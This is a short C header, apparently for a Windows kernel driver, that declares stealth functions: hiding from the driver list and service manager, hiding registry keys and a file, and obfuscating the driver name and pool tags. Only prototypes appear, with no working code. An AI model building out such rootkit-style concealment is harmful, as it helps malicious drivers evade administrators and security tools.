#pragma once

NTSTATUS EnableStealthMode(VOID);
NTSTATUS DisableStealthMode(VOID);

// Hiding techniques
NTSTATUS HideFromDriverList(VOID);
NTSTATUS HideFromServiceManager(VOID);
NTSTATUS HideRegistryKeys(VOID);
NTSTATUS HideFile(VOID);

// Obfuscation
VOID ObfuscateDriverName(VOID);
VOID RandomizePoolTags(VOID);